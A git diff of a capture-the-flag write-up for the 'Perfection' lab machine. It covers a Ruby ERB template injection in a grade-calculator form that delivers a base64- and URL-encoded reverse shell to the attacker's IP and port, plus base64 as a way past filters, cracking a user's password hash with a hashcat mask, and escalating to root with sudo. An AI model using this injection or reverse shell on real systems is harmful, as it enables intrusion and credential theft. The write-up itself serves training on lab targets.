@@ -1,34 +1,46 @@
-# Tutorial
+# Perfection
+
+![Alt text](pic23.png)
+
+## Contents
+
+1. Network fundamentals
+2. Ruby ERB vulnerability injection
+3. Reverse Shell
+
+
+## Tutorial
 
 Note: For better understanding I recommend reading first "Headless" machine as I explain some fundamentals there.
 
 Let's start pinging:
 
-(pic1)
+![Alt text](pic1.png)
 
 Receives packets. Now let's start scanning the domain:
 
-(pic2)
+![Alt text](pic2.png)
 
 3 open ports. One ssh, http and http-alt. Let's analyze the http because it is a good way to start analyzing the webserver site. We begin by using gobuster to analyze the possible directories in the domain:
 
-(pic3)
+![Alt text](pic3.png)
 
 The URLs were analyzed and couldn't find any useful information on those URLs. Let's enter manually into the site:
 
-(pic6)
+![Alt text](pic6.png)
 
 The webpage is an interactive calculator. Visiting "About Us" and "Calculate your weighted grade" we find that there is a input section that interact with the site.
 
-(pic7)
+![Alt text](pic7.png)
 
 Let's get more information about this site to infere what kind of attacks is this site vulnerable to:
 
-(pic4)
+![Alt text](pic4.png)
+![Alt text](pic5.png)
 
 Observe that the site contains `Content-Type: text/html;charset=utf-8` and `Server: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)`. So this developer must have used Ruby to develop the site. Let's analyze the content:
 
-(pic8)
+![Alt text](pic8.png)
 
 There are no clues that the frontend is running Ruby (no `<% %>/erb/ruby/rhtml` keywords). As far as the analysis can go, it seems a normal html site. Nonetheless, from the previous pictures we know that the server is using WEBrick 1.7.0, which is a Ruby-based web server. This must be specifying that the backend is running Ruby.
 
@@ -36,7 +48,7 @@ Let's look on Google a bit of information by typing "server-side template inject
 
 The only way we have to introduce a payload into the webserver is through the interactive calculator. So let's play with it obbeying its requirements described at the bottom. Using burpsuite and analyzing the request. We can observe that we can introduce a payload into the webserver. Nonetheless, we must know that we cannot use the same payload technique we used in Headless because Perfection is based on Ruby. Moreover, in one of the pictures we can observe that has XSS injection: Blocked. So instead of doing an XSS injection to get admin privileges, we are going to try to get a reverse shell to the Ruby webserver. The burpsuite analysis is the following:
 
-(pic9)
+![Alt text](pic9.png)
 
 #### Thinking about the payload
 
@@ -70,20 +82,20 @@ This effectively sets up a reverse shell, where the compromised server connects 
 
 You must be aware that you cannot inject the payload directly. It is necessary to encode it into Base64. Why? Shell commands often contain special characters that could be misinterpreted by the server or web application. Also, characters like spaces or special symbols (<, >, &) can break the command or be deleted by security mechanisms from the server. So, encoding the command in base64 makes it less likely to be detected and blocked by such filters because the payload appears as a harmless string of alphanumeric characters. So, using the reasoning explained by encoding the reverse shell injection command into Base64 and later into URL encoding, the outcome is as follows:
 
-(pic10)
+![Alt text](pic10.png)
 
 ##### The listener
 
 Now, time to set up the listener:
 
-(pic11)
+![Alt text](pic11-1.png)
 
 ##### Inject the reverse Shell
 
 Time to inject the reverse shell. Using our previously encoded payload (first into base64 and later into URL encode) the final command injection is as follows:
-
+```
 category1=test1%0A<%25%3dsystem("echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC43Ni83MzczIDA%2BJjE%3D|+base64+-d+|+bash");%25>1
-
+```
 Why %0A at the beginning of the payload? For Ruby to interpretate test1 and then independently the payload as a newline.
 The part `|+base64+-d+|+bash`in the injection payload is used to decode a base64-encoded string and then execute it as a shell command.
 1. First ruby decodes the string in URL format
@@ -93,15 +105,18 @@ The part `|+base64+-d+|+bash`in the injection payload is used to decode a base64
 
 Open burp-suite again. Fill some data into the burp-browser (with the intercept on) and submit it. You will see the request stopped on burp-suite. Right-click and select "send to repeater". Edit the request there and add the payload encoded. Click on "Send". Open the terminal where your netcat listener is open:
 
-(pic13)
+![Alt text](pic12.png)
+![Alt text](pic13.png)
 
 Bingo. You got access to the webserver application. Now playing around like I did in the previous picture you can get the user flag.
+
+![Alt text](pic11.png)
 
 #### Root flag
 
 After playing around with all the folders possible in the remote shell, the only interesting file found is the one located at `/home/susan/Migration`. The file is a `.db`. If you open it using cat you won't be able to appreciate the content correctly because the file is in binary format. Binary files contain not only text but also binary data that represents various non-printable characters and metadata necessary for the database engine to interpret the file correctly. The `strings` command is designed to extract and display printable text strings from binary files. Some example of .db files are SQLlite.db files.
 
-(pic15)
+![Alt text](pic15.png)
 
 This file contains the password for several users. The password we need is the Susan one because we are logged into `susan@perfection:~/Migration$`. A good way to decipher the password is to use hashcat.
 
@@ -111,11 +126,11 @@ Hashcat is an open-source password recovery tool used for recovering lost passwo
 
 Grab this hash you found and in another terminal save it into a .txt file and run hashcat.
 
-(pic16)
+![Alt text](pic16.png)
 
 You will see that it takes too long and requests you for a mask for better performance. A `mask` refers to a string pattern used to generate password candidates during a brute-force attack. The mask specifies the structure of the passwords that hashcat will attempt to crack. Where can we obtain such mask? Let's do a deeper search on the webserver. Go to `cd ~` and run the following command: `find / -name "*mask*" -ls 2>dev/null`. You will get the following outcome:
 
-(pic17)
+![Alt text](pic17.png)
 
 There is an enormous amount of files that show the keyword "mask". Maybe this is a too generic word. Analyzing each of the files would be a nightmare. Also, the path and filename seem not to give any hints. Let's try with "*password*" and "*susan*". With "*password*" it will be the same, a huge number of files which do not show any meaningful information. When you run:
 
@@ -125,26 +140,33 @@ find / -name "*susan*" -ls 2>/dev/null
 
 Where `find /` starts the find command at the root directory. `-name "*susan*"` searches with the pattern *susan*. `-type f` looks for files that has such *susan* keyword. `-ls` shows the path to (and more detailed information) of that file. `2>/dev/null` avoids showing error messages in the search (e.g., permission-denied errors). You will get three files. We saw two of them. Let's see this third one:
 
-(pic18)
+![Alt text](pic18.png)
 
-So the mask is {firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}. All letters of the firstname should be in lowercase. Our target user is susan, so the mask would be `susan_nasus_?d?d?d?d?d?d?d?d?d?d`. What is `?d`? It represents a digit in hashcat command, and it is repeated ten times, indicating a ten-digit sequence because the integer &isin; (1-1,000,000,000). Run the following command in another terminal:
+So the mask is {firstname}_ {firstname backwards}_ {randomly generated integer between 1 and 1,000,000,000}. All letters of the firstname should be in lowercase. Our target user is susan, so the mask would be `susan_nasus_?d?d?d?d?d?d?d?d?d?d`. What is `?d`? It represents a digit in hashcat command to decipher, and it is repeated ten times (because it is 1*10⁹), indicating a ten-digit sequence because the integer &isin; (1-1,000,000,000). Run the following command in another terminal:
 
-(pic18-1)
+![Alt text](pic18-1.png)
 
 While hashcat is trying to get the password, type `sudo -l` in your netcat listener. You will see that you can't request for sudo access. This is because the shell is not stabilized. Do the following (explained in Headless machine)
 
-(pic19)
+![Alt text](pic19.png)
 
-Now you can introduce the password. Nonetheless, hashcat returned no results with our query:
+Now you can introduce the password. Go back to hashcat. Nonetheless, hashcat returned no results with our query:
+
+![Alt text](pic18-1.png)
 
 After 6 hours using hashcat, no results were found. This can be because of two reasons:
 
 1. We don't have enough information yet
-2. The command introduced is not correct and the susan email meant 9 numbers instead of 10.
+2. The command introduced is not correct and the susan email meant 9 numbers instead of 10 (because it is up to 1*10⁹ digits and the sentence was not correctly specified mathematically).
 
 Let's run the same command with 9 numbers in the command. You will obtain the password for susan:
 
-(pic20)
+![Alt text](pic20.png)
+
+After 15 minutes (what a reduction) the hash is cracked:
+
+![Alt text](pic21.png)
 
 Introducing the password into sudo, it is easily obtained the root password:
 
+![Alt text](pic22.png)
